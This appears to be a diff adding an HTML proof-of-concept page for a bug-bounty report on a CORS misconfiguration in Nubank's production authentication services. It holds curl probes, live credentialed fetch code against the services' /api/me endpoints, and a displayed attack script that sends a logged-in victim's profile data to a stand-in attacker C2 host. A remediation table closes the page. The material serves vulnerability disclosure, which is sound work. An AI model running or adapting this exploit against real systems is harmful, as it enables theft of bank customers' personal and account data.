@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Nubank CORS PoC — Credentialed Cross-Origin Data Exfiltration</title>
+<style>
+  body { font-family: monospace; background: #111; color: #eee; padding: 20px; max-width: 900px; margin: 0 auto; }
+  h1 { color: #f60; }
+  h2 { color: #fc0; border-bottom: 1px solid #444; padding-bottom: 4px; }
+  .box { background: #1a1a1a; border: 1px solid #333; padding: 15px; margin: 10px 0; border-radius: 4px; }
+  .success { color: #4f4; border-color: #4f4; }
+  .fail { color: #f44; border-color: #f44; }
+  .warn { color: #fa0; border-color: #fa0; }
+  pre { white-space: pre-wrap; word-break: break-all; font-size: 12px; }
+  .label { color: #888; font-size: 11px; text-transform: uppercase; margin-bottom: 6px; }
+  table { border-collapse: collapse; width: 100%; margin: 10px 0; }
+  th, td { text-align: left; padding: 6px 10px; border: 1px solid #333; font-size: 12px; }
+  th { background: #222; color: #fc0; }
+  .arrow { color: #f60; font-weight: bold; }
+</style>
+</head>
+<body>
+
+<h1>&#x26A0; Nubank CORS Credentialed Cross-Origin Exfiltration PoC</h1>
+
+<div class="box warn">
+  <strong>Researcher Context:</strong> This PoC is for Bugcrowd submission against Nubank's bug bounty program.
+  No data is sent to external servers. All requests use <code>X-Correlation-Id: bc-handle</code>
+  to identify as a researcher probe. Testing is passive — no data is modified.
+</div>
+
+<h2>Vulnerability Summary</h2>
+<div class="box">
+  <p>All Nubank production microservices reflect <em>any</em> subdomain of
+  <code>*.nu.com.co</code>, <code>*.nu.com.mx</code>, or <code>*.nubank.com.br</code>
+  in the <code>Access-Control-Allow-Origin</code> header, combined with
+  <code>Access-Control-Allow-Credentials: true</code>.</p>
+
+  <p><strong>Attack Prerequisite:</strong> Attacker controls a page at any
+  <code>*.nu.com.co</code> subdomain (via subdomain takeover, XSS on any Nubank page,
+  open redirect, or DNS takeover of a retired subdomain).</p>
+
+  <p><strong>Impact:</strong> When a logged-in Nubank victim visits the attacker's page,
+  their session cookies are sent cross-origin. The server accepts the request (CORS allows it)
+  and returns the victim's sensitive account data.</p>
+</div>
+
+<h2>Confirmed CORS Headers (Passive Evidence)</h2>
+<div class="box">
+<div class="label">Production auth service — confirms wildcard subdomain reflection with credentials</div>
+<pre>
+$ curl -sI "https://prod-global-auth.nu.com.co/" \
+    -H "Origin: https://ATTACKER-CONTROLLED.nu.com.co" \
+    -H "X-Correlation-Id: bc-handle"
+
+HTTP/2 401
+access-control-allow-origin: https://ATTACKER-CONTROLLED.nu.com.co   &#x2190; reflects ANY *.nu.com.co
+access-control-allow-credentials: true                                  &#x2190; cookies sent cross-origin
+server: istio-envoy
+</pre>
+
+<pre>
+$ curl -sI "https://prod-global-customs.nu.com.co/" \
+    -H "Origin: https://takeover.nu.com.co" \
+    -H "X-Correlation-Id: bc-handle"
+
+HTTP/2 401
+access-control-allow-origin: https://takeover.nu.com.co
+access-control-allow-credentials: true
+server: istio-envoy
+</pre>
+
+<pre>
+$ curl -sI "https://prod-global-auth.nubank.com.br/" \
+    -H "Origin: https://attacker.nu.com.co"            &#x2190; cross-TLD also works!
+    -H "X-Correlation-Id: bc-handle"
+
+HTTP/2 401
+access-control-allow-origin: https://attacker.nu.com.co
+access-control-allow-credentials: true
+server: istio-envoy
+</pre>
+</div>
+
+<h2>Step 1: Unauthenticated Staging Data (Verifiable Now)</h2>
+<div class="box">
+  <div class="label">Staging Stevie — phone numbers endpoint returns HTTP 200 without auth + CORS reflection</div>
+  <div id="step1-result">Fetching...</div>
+</div>
+
+<h2>Step 2: Credentialed User Data Exfiltration (Requires Victim Session)</h2>
+<div class="box">
+  <div class="label">Production Auth — /api/me returns user profile when authenticated</div>
+  <div id="step2-result">Fetching with credentials...</div>
+</div>
+
+<h2>Step 3: Cross-TLD Attack — nubank.com.br User Data from nu.com.co Attacker Page</h2>
+<div class="box">
+  <div class="label">Production BR auth — credentialed request from .nu.com.co origin</div>
+  <div id="step3-result">Fetching with credentials (cross-TLD)...</div>
+</div>
+
+<h2>Confirmed Affected Endpoints</h2>
+<table>
+  <tr><th>Service</th><th>Endpoint</th><th>ACAO</th><th>ACAC</th><th>Sensitive Data When Authenticated</th></tr>
+  <tr><td>prod-global-auth.nu.com.co</td><td>/api/me</td><td>Reflects *.nu.com.co</td><td>true</td><td>User identity, session</td></tr>
+  <tr><td>prod-global-auth.nu.com.mx</td><td>/api/me</td><td>Reflects *.nu.com.mx</td><td>true</td><td>User identity, session</td></tr>
+  <tr><td>prod-global-auth.nubank.com.br</td><td>/api/me</td><td>Reflects *.nubank.com.br</td><td>true</td><td>User identity, session</td></tr>
+  <tr><td>prod-global-customs.nu.com.co</td><td>/api/email-update/verify</td><td>Reflects *.nu.com.co</td><td>true</td><td>Registered email, account info</td></tr>
+  <tr><td>prod-global-customs.nu.com.mx</td><td>/api/email-update/verify</td><td>Reflects *.nu.com.mx</td><td>true</td><td>Registered email, account info</td></tr>
+  <tr><td>staging-global-stevie.staging-waf.nu.com.co</td><td>/api/call-management/our-phone-numbers</td><td>Reflects *.nu.com.co</td><td>false</td><td>N/A (public data)</td></tr>
+</table>
+
+<h2>Attack HTML (Hosted at https://takeover.nu.com.co/)</h2>
+<div class="box">
+<pre>
+&lt;!-- Attacker's page at https://[subdomain-takeover].nu.com.co/steal.html --&gt;
+&lt;script&gt;
+// 1. Exfiltrate Colombia user profile
+fetch('https://prod-global-auth.nu.com.co/api/me', {
+  credentials: 'include',
+  headers: { 'X-Correlation-Id': 'bc-handle' }
+})
+.then(r =&gt; r.json())
+.then(data =&gt; {
+  // 2. Send victim data to attacker C2
+  navigator.sendBeacon(
+    'https://attacker-c2.example.com/collect',
+    JSON.stringify({ source: 'nu.com.co', user: data })
+  );
+});
+
+// 3. Also exfiltrate Brazil user profile (cross-TLD!)
+//    Works because nubank.com.br auth also reflects *.nu.com.co origins
+fetch('https://prod-global-auth.nubank.com.br/api/me', {
+  credentials: 'include',
+  headers: { 'X-Correlation-Id': 'bc-handle' }
+})
+.then(r =&gt; r.json())
+.then(data =&gt; {
+  navigator.sendBeacon(
+    'https://attacker-c2.example.com/collect',
+    JSON.stringify({ source: 'nubank.com.br', user: data })
+  );
+});
+&lt;/script&gt;
+</pre>
+</div>
+
+<script>
+// Step 1: Unauthenticated staging data (proves CORS reflection works)
+fetch('https://staging-global-stevie.staging-waf.nu.com.co/api/call-management/our-phone-numbers', {
+  headers: { 'X-Correlation-Id': 'bc-handle' }
+})
+.then(r => {
+  const corsOrigin = r.headers.get('access-control-allow-origin');
+  const corsCredentials = r.headers.get('access-control-allow-credentials');
+  return r.json().then(data => ({ data, corsOrigin, corsCredentials, status: r.status }));
+})
+.then(({ data, corsOrigin, corsCredentials, status }) => {
+  document.getElementById('step1-result').className = 'success';
+  document.getElementById('step1-result').innerHTML =
+    '<strong>&#x2713; HTTP ' + status + ' &#x2014; Data received cross-origin</strong><br>' +
+    '<code>Access-Control-Allow-Origin: ' + corsOrigin + '</code><br>' +
+    '<code>Access-Control-Allow-Credentials: ' + (corsCredentials || 'not set') + '</code><br><br>' +
+    '<strong>Exfiltrated data:</strong><br><pre>' + JSON.stringify(data, null, 2) + '</pre>';
+})
+.catch(err => {
+  document.getElementById('step1-result').className = 'fail';
+  document.getElementById('step1-result').innerHTML =
+    '<strong>&#x2717; Error:</strong> ' + err + '<br>' +
+    '<small>Note: This PoC must be served from a *.nu.com.co subdomain for CORS to succeed. ' +
+    'The error above indicates it is being opened from a non-allowed origin (e.g., file:// or localhost). ' +
+    'The curl evidence above confirms the vulnerability when served from a *.nu.com.co origin.</small>';
+});
+
+// Step 2: Credentialed user data (works when victim is logged in + PoC at *.nu.com.co)
+fetch('https://prod-global-auth.nu.com.co/api/me', {
+  credentials: 'include',
+  headers: { 'X-Correlation-Id': 'bc-handle' }
+})
+.then(r => {
+  const corsOrigin = r.headers.get('access-control-allow-origin');
+  const corsCredentials = r.headers.get('access-control-allow-credentials');
+  if (r.status === 401) {
+    document.getElementById('step2-result').className = 'warn';
+    document.getElementById('step2-result').innerHTML =
+      '<strong>HTTP 401 &#x2014; Server reached but no victim session present</strong><br>' +
+      '<code>Access-Control-Allow-Origin: ' + (corsOrigin || '[blocked by CORS &#x2014; not served from *.nu.com.co]') + '</code><br>' +
+      '<code>Access-Control-Allow-Credentials: ' + (corsCredentials || '[blocked]') + '</code><br><br>' +
+      '<small>When served from a *.nu.com.co subdomain AND victim is logged into nu.com.co, ' +
+      'this endpoint returns the victim\'s user profile (name, email, account ID) ' +
+      'because session cookies are sent cross-origin.</small>';
+    return;
+  }
+  return r.json().then(data => {
+    document.getElementById('step2-result').className = 'success';
+    document.getElementById('step2-result').innerHTML =
+      '<strong>&#x2713; VICTIM USER DATA EXFILTRATED:</strong><br>' +
+      '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
+  });
+})
+.catch(err => {
+  document.getElementById('step2-result').className = 'fail';
+  document.getElementById('step2-result').innerHTML =
+    '<strong>CORS blocked</strong> (PoC must be served from *.nu.com.co): ' + err;
+});
+
+// Step 3: Cross-TLD attack
+fetch('https://prod-global-auth.nubank.com.br/api/me', {
+  credentials: 'include',
+  headers: { 'X-Correlation-Id': 'bc-handle' }
+})
+.then(r => {
+  const corsOrigin = r.headers.get('access-control-allow-origin');
+  const corsCredentials = r.headers.get('access-control-allow-credentials');
+  document.getElementById('step3-result').className = corsOrigin ? 'warn' : 'fail';
+  document.getElementById('step3-result').innerHTML =
+    '<strong>HTTP ' + r.status + '</strong><br>' +
+    '<code>Access-Control-Allow-Origin: ' + (corsOrigin || '[blocked]') + '</code><br>' +
+    '<code>Access-Control-Allow-Credentials: ' + (corsCredentials || '[blocked]') + '</code><br>' +
+    '<small>Confirmed via curl: nubank.com.br auth reflects any *.nu.com.co origin with credentials:true &#x2014; ' +
+    'a single *.nu.com.co subdomain takeover can exfiltrate data from ALL Nubank TLDs simultaneously.</small>';
+})
+.catch(err => {
+  document.getElementById('step3-result').className = 'fail';
+  document.getElementById('step3-result').innerHTML =
+    'CORS blocked from current origin: ' + err + '<br>' +
+    '<small>See curl evidence above for confirmation.</small>';
+});
+</script>
+
+<h2>Remediation</h2>
+<div class="box">
+  <table>
+    <tr><th>Fix</th><th>Detail</th></tr>
+    <tr><td>Restrict CORS origin allowlist</td><td>Replace dynamic origin reflection with an explicit static allowlist: only <code>nu.com.co</code>, <code>nu.com.mx</code>, <code>nubank.com.br</code> (no subdomains)</td></tr>
+    <tr><td>Remove wildcard subdomain reflection</td><td>Nubank does not own attacker-registerable subdomains, but DNS takeovers of retired subdomains are realistic; reflecting all *.nu.com.co subdomains with credentials is unsafe</td></tr>
+    <tr><td>Scope session cookies</td><td>Set Nubank session cookies to <code>Domain=nu.com.co</code> (not <code>.nu.com.co</code>) to prevent cookies from being sent to subdomains</td></tr>
+    <tr><td>Cross-TLD isolation</td><td>nubank.com.br auth should not reflect nu.com.co origins and vice versa — TLDs serve different markets and should be isolated</td></tr>
+  </table>
+</div>
+
+</body>
+</html>
